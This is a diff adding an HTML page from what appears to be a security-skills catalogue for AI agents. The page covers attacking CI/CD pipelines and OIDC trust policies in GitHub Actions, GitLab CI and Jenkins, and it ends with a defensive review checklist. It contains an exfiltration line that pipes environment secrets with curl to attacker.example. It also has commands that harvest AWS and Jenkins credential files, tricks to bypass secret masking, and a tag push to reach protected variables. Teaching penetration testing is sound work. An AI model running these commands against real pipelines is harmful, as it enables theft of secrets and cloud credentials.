@@ -1,0 +1,273 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>abusing-ci-cd-oidc — SecSkills</title><link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%9B%A1%EF%B8%8F%3C/text%3E%3C/svg%3E"><link rel="stylesheet" href="style.css"><style>
+    .shead{padding:56px 0 34px}
+    .crumb{font-family:var(--mono);font-size:12.5px;color:var(--muted);margin-bottom:20px}
+    .crumb a{color:var(--muted)}
+    h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
+    .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
+    .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
+    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
+    .inst .p{color:var(--faint);user-select:none}
+    article{padding:44px 0 72px;border-top:1px solid var(--border)}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
+    article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
+    article p{margin:0 0 15px;max-width:74ch}
+    article ul,article ol{margin:0 0 16px;padding-left:22px;max-width:74ch}
+    article li{margin:5px 0}article li>ul{margin:5px 0}
+    article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
+    article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
+    article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
+    .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
+    article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
+    article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    </style></head><body>
+<div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
+<nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
+<button class="tbtn" id="tbtn" aria-label="Toggle theme">theme</button></div></div>
+<header class="shead"><div class="wrap">
+  <div class="crumb"><a href="index.html">secskills</a> / offense / abusing-ci-cd-oidc</div>
+  <h1 class="sk">abusing-ci-cd-oidc</h1>
+  <div class="stags">
+    <span><span class="dot dot-offense"></span> offense</span>
+    <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-27</span>
+  </div>
+  <p class="sdesc">Exploit CI/CD pipeline misconfigurations and OIDC federation weaknesses across GitHub Actions, GitLab CI, and Jenkins -- poisoned workflows, secret exfiltration, runner compromise, overly broad OIDC trust policies, build artifact poisoning, and credential theft. Use when pentesting CI/CD infrastructure, assessing OIDC federation trust boundaries, reviewing pipeline security posture, or exploiting a path from repository access to cloud credentials.</p>
+  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+<span class="p">$ </span>/plugin install secskills-core</div>
+</div></header>
+<article><div class="wrap"><p>CI/CD pipelines are high-privilege execution environments, often with direct cloud IAM access, deploy credentials, and signing keys. OIDC federation turns a repository write into cloud credential issuance when the trust policy is too broad. A single misconfigured workflow or a wildcard subject claim can bridge the gap from "can open a pull request" to "has production cloud access."</p>
+<h2>When to Use</h2>
+<ul>
+<li>Assessing GitHub Actions, GitLab CI, or Jenkins for exploitable misconfigurations</li>
+<li>Testing OIDC federation trust policies between CI providers and cloud platforms</li>
+<li>Extracting secrets, tokens, or credentials from pipeline execution environments</li>
+<li>Evaluating self-hosted runner isolation and shared runner risk</li>
+<li>Attempting lateral movement from CI/CD into cloud accounts via OIDC</li>
+<li>Reviewing build artifact integrity and cache poisoning attack surface</li>
+</ul>
+<h2>When NOT to Use</h2>
+<ul>
+<li><strong>Dependency and package supply chain attacks</strong> -- use <a class="xref" href="auditing-supply-chain.html"><code>auditing-supply-chain</code></a></li>
+<li><strong>Cloud IAM exploitation not originating from CI/CD</strong> -- use <a class="xref" href="exploiting-cloud-platforms.html"><code>exploiting-cloud-platforms</code></a></li>
+<li><strong>Static code review of pipeline definitions as pure source</strong> -- use <a class="xref" href="auditing-code-for-vulnerabilities.html"><code>auditing-code-for-vulnerabilities</code></a></li>
+</ul>
+<h2>GitHub Actions</h2>
+<h3>Poisoned Workflows</h3>
+<p><code>pull_request_target</code> runs in the base repo context with secrets and a write-scoped <code>GITHUB_TOKEN</code>, but can be triggered by a fork PR.</p>
+<pre><code># Find pull_request_target triggers that check out PR head code
+rg -n 'pull_request_target' -A20 .github/workflows/ | rg 'checkout|ref.*head'
+
+# Script injection: untrusted PR/issue data interpolated into run blocks
+rg -n '\$\{\{\s*github\.event\.(issue|pull_request|comment|review)' .github/workflows/</code></pre>
+<p><strong>Attack pattern:</strong> fork the repo, modify the checked-out code path (build script, Makefile, test harness), open a PR. The workflow executes your code with the base repo's secrets. Exfiltrate via DNS, HTTP callback, or artifact.</p>
+<h3>Secret Exfiltration and Token Scope</h3>
+<pre><code># Secrets are in the environment -- exfiltrate out-of-band
+env | base64 | curl -d @- https://attacker.example/exfil
+
+# GITHUB_TOKEN scope check
+curl -s -H "Authorization: token $GITHUB_TOKEN" \
+  https://api.github.com/repos/OWNER/REPO -I | grep 'x-oauth-scopes'
+
+# Check if permissions are restricted in the workflow
+rg -n 'permissions:' .github/workflows/
+rg -n 'permissions:\s*write-all' .github/workflows/</code></pre>
+<p>Unrestricted <code>GITHUB_TOKEN</code> defaults to read+write on contents, packages, and more. With a write-scoped token: push to branches, create releases, modify packages, approve deployments.</p>
+<h3>Self-Hosted Runner Compromise</h3>
+<p>Self-hosted runners on public repos are a critical finding. They persist between jobs, so a malicious workflow leaves implants for subsequent jobs.</p>
+<pre><code>rg -n 'runs-on:.*self-hosted' .github/workflows/
+
+# On a compromised runner: harvest credentials from prior jobs
+find / -name '.credentials' -o -name '.env' -o -name '*.pem' 2&gt;/dev/null
+cat /home/runner/.aws/credentials</code></pre>
+<h3>Artifact Poisoning</h3>
+<pre><code># If a PR workflow uploads build artifacts consumed by a deploy workflow,
+# the PR author controls what gets deployed
+rg -n 'upload-artifact|download-artifact' .github/workflows/</code></pre>
+<h2>GitLab CI</h2>
+<h3>Runner Tokens and Shared Runners</h3>
+<pre><code># Exposed runner registration tokens allow registering rogue runners
+rg -rn 'RUNNER_TOKEN\|REGISTRATION_TOKEN\|CI_JOB_TOKEN' .gitlab-ci.yml
+
+# CI_JOB_TOKEN can access other projects if inter-project deps are configured
+curl --header "JOB-TOKEN: $CI_JOB_TOKEN" \
+  "https://gitlab.example/api/v4/projects/OTHER_ID/repository/files/secret.txt/raw?ref=main"
+
+# Shared runners: Docker socket mount leaks between jobs
+rg -n 'docker:dind\|/var/run/docker.sock' .gitlab-ci.yml</code></pre>
+<h3>CI Variables Extraction</h3>
+<pre><code># Masked variables are hidden from logs but present in env
+printenv &gt; /tmp/all_vars.txt &amp;&amp; cat /tmp/all_vars.txt
+
+# Protected variables: only on protected branches/tags
+# Push a tag matching the protection pattern to access them
+git tag release-exploit &amp;&amp; git push origin release-exploit</code></pre>
+<h2>OIDC Federation Abuse</h2>
+<p>OIDC federation lets CI jobs assume cloud roles without stored credentials. The security boundary is the trust policy's subject claim filter.</p>
+<h3>Overly Broad Subject Claims</h3>
+<pre><code># AWS: inspect IAM role trust policy conditions
+aws iam get-role --role-name ci-deploy-role \
+  --query 'Role.AssumeRolePolicyDocument' --output json
+
+# Dangerous patterns in the Condition block:
+# "sub": "repo:org/*"                     -- any repo in the org
+# "sub": "repo:org/repo:*"                -- any branch, any environment
+# "sub": "repo:org/repo:ref:refs/heads/*" -- any branch
+# No Condition at all                      -- any token from the IdP</code></pre>
+<p><strong>Vulnerable AWS trust policy:</strong></p>
+<pre><code>{
+  "Effect": "Allow",
+  "Principal": {"Federated": "arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com"},
+  "Action": "sts:AssumeRoleWithWebIdentity",
+  "Condition": {
+    "StringLike": {
+      "token.actions.githubusercontent.com:sub": "repo:org-name/*"
+    }
+  }
+}</code></pre>
+<p>Any repo in the org can assume this role. Abandoned repos, docs repos, and repos with loose contributor policies become pivots to production cloud access.</p>
+<h3>GCP and Azure</h3>
+<pre><code># GCP: check attribute conditions on workload identity provider
+gcloud iam workload-identity-pools providers describe PROVIDER \
+  --location=global --workload-identity-pool=POOL
+# Vulnerable: no attribute condition, or condition matching only the org
+
+# Azure: list federated identity credentials
+az ad app federated-credential list --id APP_OBJECT_ID
+# Same wildcard risks: "repo:org/*" or "repo:org/repo:ref:refs/heads/*"
+# Safe: "repo:org/repo:environment:production"</code></pre>
+<h3>Environment Protection Bypass</h3>
+<p>Environment protection rules gate OIDC token issuance only if the trust policy conditions include <code>:environment:</code>. A policy matching <code>repo:org/repo:*</code> ignores environments, so required reviewers provide no protection.</p>
+<pre><code>rg -n 'environment:' .github/workflows/
+# Compare to the trust policy Condition -- if it lacks :environment:, bypass</code></pre>
+<h2>Jenkins</h2>
+<h3>Groovy Console and Credentials</h3>
+<pre><code># Script console (/script) runs arbitrary Groovy as SYSTEM
+# Check for unauthenticated access
+curl -s -o /dev/null -w "%{http_code}" http://jenkins.target/script
+
+# Credential files on disk
+cat /var/lib/jenkins/credentials.xml
+cat /var/lib/jenkins/secrets/master.key
+cat /var/lib/jenkins/secrets/hudson.util.Secret</code></pre>
+<h3>Pipeline Library Injection</h3>
+<pre><code># Shared libraries via @Library execute in the pipeline sandbox
+# If the library repo is writable, inject code into vars/ or src/
+rg -n '@Library\|library\(' Jenkinsfile
+
+# "Load implicitly" enabled = every pipeline runs the library's code</code></pre>
+<h2>Secrets in CI</h2>
+<h3>Extracting Masked Variables</h3>
+<pre><code># Masking hides secrets from logs but not from the process environment
+echo "$SECRET_VAR" | base64                    # bypass log masking
+echo "$SECRET_VAR" | sed 's/./&amp;\n/g'           # char-by-char bypass
+echo "$SECRET_VAR" &gt; secret_dump.txt           # write to artifact</code></pre>
+<h3>OIDC Token Interception</h3>
+<pre><code># GitHub Actions: request the OIDC token
+curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+  "$ACTIONS_ID_TOKEN_REQUEST_URL&amp;audience=sts.amazonaws.com"
+
+# JWT is reusable until expiry (typically 5-15 minutes)
+echo "$TOKEN" | cut -d. -f2 | base64 -d 2&gt;/dev/null | jq .</code></pre>
+<h3>Long-Lived Tokens as CI Secrets</h3>
+<pre><code># Credentials that should have been replaced by OIDC
+env | grep -i 'AWS\|AKIA'                     # AWS access keys
+env | grep -i 'AZURE\|ARM_CLIENT'             # Azure SP credentials
+find / -name '*service*account*.json' 2&gt;/dev/null  # GCP SA keys</code></pre>
+<h2>Build Artifact Poisoning</h2>
+<h3>Cache Poisoning</h3>
+<pre><code># CI caches shared across branches -- a PR can poison the main-branch cache
+rg -n 'actions/cache' -A5 .github/workflows/
+# Check whether cache keys include dependency lock file hashes
+
+rg -n 'cache:' -A10 .gitlab-ci.yml
+# key: $CI_COMMIT_REF_SLUG is branch-scoped but forks may share</code></pre>
+<h3>Dependency Confusion via Internal Registries</h3>
+<pre><code># If CI resolves from both internal and public registries,
+# a higher-version public package wins resolution
+rg -rn 'registry\|index-url\|repository' .npmrc .yarnrc pip.conf pyproject.toml
+# Non-scoped internal packages (@org/pkg format) are vulnerable</code></pre>
+<h2>Defensive Review Checklist</h2>
+<p><strong>OIDC subject claim strictness:</strong></p>
+<ul>
+<li>[ ] Trust policies pin to specific repository (not org-wide wildcard)</li>
+<li>[ ] Trust policies require specific branch or environment in the subject</li>
+<li>[ ] Environment protection rules are configured for production deployments</li>
+</ul>
+<p><strong>Workflow approval gates:</strong></p>
+<ul>
+<li>[ ] <code>pull_request_target</code> workflows do not check out PR head code</li>
+<li>[ ] Fork PRs require approval before workflows run</li>
+<li>[ ] Required reviewers are set on deployment environments</li>
+<li>[ ] Branch protection prevents direct pushes to release branches</li>
+</ul>
+<p><strong>Runner isolation:</strong></p>
+<ul>
+<li>[ ] Self-hosted runners are not used on public repositories</li>
+<li>[ ] Runners are ephemeral (destroyed after each job)</li>
+<li>[ ] Docker socket is not mounted into CI jobs</li>
+</ul>
+<p><strong>Secrets hygiene:</strong></p>
+<ul>
+<li>[ ] No long-lived cloud credentials stored as CI secrets (use OIDC)</li>
+<li>[ ] <code>GITHUB_TOKEN</code> permissions are explicitly restricted per-job</li>
+<li>[ ] Secrets are not available to fork-triggered workflows</li>
+</ul>
+<p><strong>Build integrity:</strong></p>
+<ul>
+<li>[ ] Third-party actions/images are pinned by SHA, not mutable tag</li>
+<li>[ ] Cache keys include dependency lock file hashes</li>
+<li>[ ] Build artifacts are signed and verified before deployment</li>
+<li>[ ] Internal packages use scoped registries with no public fallback</li>
+</ul>
+<h2>Rationalizations to Reject</h2>
+<ul>
+<li><em>"The OIDC trust policy is org-scoped, and we trust all our repos."</em></li>
+</ul>
+<p>Any repo in the org becomes a pivot to cloud access. Abandoned repos, forks, and repos with loose contributor policies are all in scope.</p>
+<ul>
+<li><em>"Secrets are masked in the logs."</em> Masking is a log-display feature,</li>
+</ul>
+<p>not a security boundary. Secrets are plaintext in the process environment.</p>
+<ul>
+<li><em>"The workflow only runs on PRs from maintainers."</em> Unless fork PR</li>
+</ul>
+<p>approval is enforced at the repo or org level, external contributors can trigger <code>pull_request_target</code> workflows.</p>
+<ul>
+<li><em>"Our runners are internal, so they are safe."</em> Internal runners that</li>
+</ul>
+<p>persist between jobs accumulate credentials from every job they execute. Ephemeral runners are the control.</p>
+<ul>
+<li><em>"We use environment protection rules."</em> Protection rules only gate</li>
+</ul>
+<p>OIDC token issuance if the trust policy conditions include the environment claim. A policy matching <code>repo:org/repo:*</code> ignores environments entirely.</p>
+<ul>
+<li><em>"It is just the CI token, it expires quickly."</em> A 15-minute OIDC token</li>
+</ul>
+<p>is enough to exfiltrate data, modify infrastructure, or establish persistence in the cloud account. Short-lived is not harmless.</p>
+<ul>
+<li><em>"The pipeline code is reviewed before merge."</em> Review of the pipeline</li>
+</ul>
+<p>definition does not protect against <code>pull_request_target</code>, which runs the attacker's code before any merge.</p>
+<h2>ATT&amp;CK Coverage</h2>
+<p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
+<p><strong>Initial Access</strong> (TA0001)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1199/">T1199</a> Trusted Relationship — see also <a class="xref" href="exploiting-cloud-platforms.html"><code>exploiting-cloud-platforms</code></a>, <a class="xref" href="attacking-entra-id.html"><code>attacking-entra-id</code></a></li>
+</ul>
+<p><strong>Credential Access</strong> (TA0006)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1552/">T1552</a> Unsecured Credentials — see also <a class="xref" href="escalating-linux-privileges.html"><code>escalating-linux-privileges</code></a>, <a class="xref" href="exploiting-cloud-platforms.html"><code>exploiting-cloud-platforms</code></a>, <a class="xref" href="auditing-supply-chain.html"><code>auditing-supply-chain</code></a></li>
+</ul>
+<p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
+<h2>References</h2>
+<ul>
+<li><a class="xref" href="auditing-supply-chain.html"><code>auditing-supply-chain</code></a> -- dependency and package-level supply chain attacks</li>
+<li><a class="xref" href="exploiting-cloud-platforms.html"><code>exploiting-cloud-platforms</code></a> -- cloud IAM exploitation beyond CI/CD origins</li>
+<li><a class="xref" href="auditing-code-for-vulnerabilities.html"><code>auditing-code-for-vulnerabilities</code></a> -- source-level review of pipeline code</li>
+<li><a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a> -- building alerts for CI/CD abuse patterns</li>
+</ul></div></article>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
